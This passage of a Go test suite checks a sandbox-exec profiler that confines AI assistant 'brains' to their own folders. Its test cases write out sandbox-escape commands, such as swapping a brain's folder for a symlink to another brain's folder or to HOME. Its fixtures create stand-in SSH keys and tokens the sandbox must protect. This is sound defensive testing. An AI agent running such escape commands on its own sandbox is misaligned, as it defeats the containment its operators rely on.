			t.Errorf("Command = %s %q, want it refused", bin, args)
		}
	})
}

// TestSandboxPinsItsOwnFolder: a brain could move its own folder aside and
// leave a symlink in its place. One to another brain's folder failed that
// brain's next profile (its folder had become one this brain's profile
// denies); one to HOME failed every profile; and the bridge, which reads and
// appends a brain's history in its folder outside the sandbox, followed the
// link. Under the real sandbox-exec the folder cannot be moved, by either
// spelling, while everything inside it stays the brain's to change.
func TestSandboxPinsItsOwnFolder(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $A, $R, $B and $HOME set
		allow     bool
	}{
		{"swap it for a link to another brain", `mv "$A" "$A.old" && ln -s "$B" "$A"`, false},
		{"swap it for a link to HOME", `mv "$A" "$A.old" && ln -s "$HOME" "$A"`, false},
		{"swap it by its real path", `mv "$R" "$R.old" && ln -s "$B" "$R"`, false},
		{"rename a file inside it", `mv "$A/notes.md" "$A/n2.md" && mv "$A/n2.md" "$A/notes.md"`, true},
		{"make and remove a folder inside it", `mkdir "$A/sub" && rmdir "$A/sub"`, true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			configured := filepath.Join(home, "assistant", "a")
			real, err := filepath.EvalSymlinks(configured)
			if err != nil {
				t.Fatal(err)
			}
			t.Setenv("A", configured)
			t.Setenv("R", real)
			t.Setenv("B", filepath.Join(home, "assistant", l.otherBrain))
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
					}
				})
			}
			if fi, err := os.Lstat(real); err != nil || !fi.IsDir() {
				t.Errorf("brain a's folder is no longer a folder: %v, %v", fi, err)
			}
			for _, id := range []string{"a", "b"} {
				if _, err := sp.Profile(id); err != nil {
					t.Errorf("Profile(%s) after the attempts: %v", id, err)
				}
			}
		})
	}
}

// symlinkedHome makes HOME a symlink, and the data dir, the credentials
// dir, the deny path, ~/.ssh and the brains' parent folder symlinks out of
// it, the way a home on another volume or a cloud-synced folder looks.
func symlinkedHome(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	realHome := filepath.Join(root, "home-real")
	if err := os.Mkdir(realHome, 0o700); err != nil {
		t.Fatal(err)
	}
	links := map[string]string{filepath.Join(root, "home"): realHome}
	for _, d := range []string{".fridolin", "creds", "clients", ".ssh", "assistant"} {
		links[filepath.Join(realHome, d)] = filepath.Join(root, "elsewhere", strings.TrimPrefix(d, "."))
	}
	for link, target := range links {
		if err := os.MkdirAll(target, 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(target, link); err != nil {
			t.Fatal(err)
		}
	}
	return filepath.Join(root, "home")
}

// sandboxFixture writes a config with brains a and b, a credentials dir,
// a deny path and an allow path, plus any extra top-level settings, loads it
// the way the bridge does, and creates one file for every check. It returns
// the profiler and a's folder.
func sandboxFixture(t *testing.T, home, otherBrain, denyDir string, extra ...map[string]any) (*SandboxProfiler, string) {
	t.Helper()
	settings := map[string]any{
		"brain_mode": true,
		"data_dir":   "~/.fridolin",
		"sandbox": map[string]any{
			"enabled":         true,
			"credentials_dir": "~/creds",
			"deny_paths":      []string{"~/" + denyDir},
			"allow_paths":     []string{"~/Documents/share"},
		},
		"brains": []map[string]any{
			{"name": "a", "work_dir": "~/assistant/a", "handles_dms": true},
			{"name": "b", "work_dir": "~/assistant/" + otherBrain, "groups": []string{"120363000000000000@g.us"}},
		},
	}
	for _, e := range extra {
		for k, v := range e {
			settings[k] = v
		}
	}
	cfgJSON, err := json.Marshal(settings)
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := LoadConfig(writeConfig(t, string(cfgJSON)))
	if err != nil {
		t.Fatal(err)
	}
	mgr := newTestManager(t, cfg)
	t.Cleanup(mgr.Stop)

	for _, f := range []string{
		"assistant/a/notes.md",
		"assistant/" + otherBrain + "/diary.md",
		".fridolin/dashboard.token",
		".fridolin/media/photo.jpg",
		"creds/google_calendar_token_a.json",
		"creds/google_calendar_token_b.json",
		".ssh/id_ed25519",
		denyDir + "/contract.txt",
		"Documents/private.txt",
		"Documents/share/ok.txt",
	} {
		p := filepath.Join(home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := os.Stat(cfg.DBPath); err != nil {
		t.Fatalf("the store did not create %s: %v", cfg.DBPath, err)
	}
	return mgr.profiler, mgr.Get("a").Dir()
}

// sandboxTry reads (cat) or writes (sh) path as brain a under its profile,
// from a's folder like a real run. Anything other than success or the
// sandbox's "Operation not permitted" fails the test, so a missing file can
// never pass as denied, and neither can sandbox-exec failing to apply the
// profile (its own errors start with "sandbox-exec:").
func sandboxTry(t *testing.T, sp *SandboxProfiler, dir string, write bool, path string) (bool, string) {
	t.Helper()
	if write {
		return sandboxRun(t, sp, dir, "/bin/sh", "-c", `printf planted > "$1"`, "sh", path)
	}
	return sandboxRun(t, sp, dir, "/bin/cat", path)
}

// sandboxRun runs prog with args as brain a under its profile, from dir,
// and reports whether it succeeded; see sandboxTry.
func sandboxRun(t *testing.T, sp *SandboxProfiler, dir, prog string, args ...string) (bool, string) {
	t.Helper()
	bin, argv, err := sp.Command("a", prog, args)
	if err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command(bin, argv...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	switch {
	case err == nil:
		return true, string(out)
	case strings.Contains(string(out), "Operation not permitted") && !strings.HasPrefix(string(out), "sandbox-exec:"):
		return false, string(out)
	}
	t.Fatalf("%s %q: %v: %s", prog, args, err, out)
	return false, ""
}

// resolvedForTest is the real path of p, resolving symlinks in its existing
// part (a file a check writes does not exist yet).
func resolvedForTest(t *testing.T, p string) string {
	t.Helper()
	dir, base := filepath.Split(p)
	real, err := filepath.EvalSymlinks(dir)
	if err != nil {
		t.Fatal(err)
	}
	return filepath.Join(real, base)
}

// TestStatusWarnsWhenSandboxDoesNotApply: the dashboard's Sandbox card says
// "On" from the config alone, so the status warns when runs are refused for
// a missing sandbox-exec or a profile that cannot be built, and when classic
// mode ignores the sandbox.
func TestStatusWarnsWhenSandboxDoesNotApply(t *testing.T) {
	const on = `, "sandbox": {"enabled": true}`
	const brains = `, "brains": [
		{"name": "a", "work_dir": "~/a", "handles_dms": true},
		{"name": "b", "work_dir": "~/b", "groups": ["120363000000000000@g.us"]}]`
	cases := []struct {
		name, extra string
		breakIt     func(sp *SandboxProfiler)
		needsExec   bool   // the case expects sandbox-exec to work
		want        string // "" for no sandbox warning
	}{
		{"working sandbox", on + brains, nil, true, ""},
		{"sandbox-exec missing", on + brains,
			func(sp *SandboxProfiler) { sp.execPath = "/nonexistent/sandbox-exec" }, false, "cannot run"},
		// b's folder is in a's profile too, so both brains are refused.
		{"brain folder the profile cannot hold", on + brains,
			func(sp *SandboxProfiler) { sp.workDirs["b"] += "\nx" }, true, "line break), so brains a, b refuse every message"},
		// config.json accepts a brain at ~, which the dashboard refuses.
		{"brain folder at the home folder", on + `, "brains": [{"name": "a", "work_dir": "~", "handles_dms": true}]`,
			nil, true, "is your home folder or holds it"},
		{"classic mode", `, "brain_mode": false` + on, nil, false, "Classic mode does not use the sandbox"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if tc.needsExec {
				requireSandboxExec(t)
			}
			tb := newTestBridge(t, tc.extra)
			if tc.breakIt != nil {
				sp := tb.brainMgr.profiler
				sp.mu.Lock()
				tc.breakIt(sp)
				sp.mu.Unlock()
			}
			w := tb.do("GET", "/api/status", nil)
			var st statusResponse
			if err := json.Unmarshal(w.Body.Bytes(), &st); err != nil {
				t.Fatal(err)
			}
			var got []string
			for _, warning := range st.Warnings {
				if strings.Contains(strings.ToLower(warning), "sandbox") {
					got = append(got, warning)
				}
			}
			switch {
			case tc.want == "" && len(got) > 0:
				t.Errorf("unexpected sandbox warnings: %q", got)
			case tc.want != "" && (len(got) != 1 || !strings.Contains(got[0], tc.want)):
				t.Errorf("sandbox warnings = %q, want one containing %q", got, tc.want)
			}
		})
	}
}
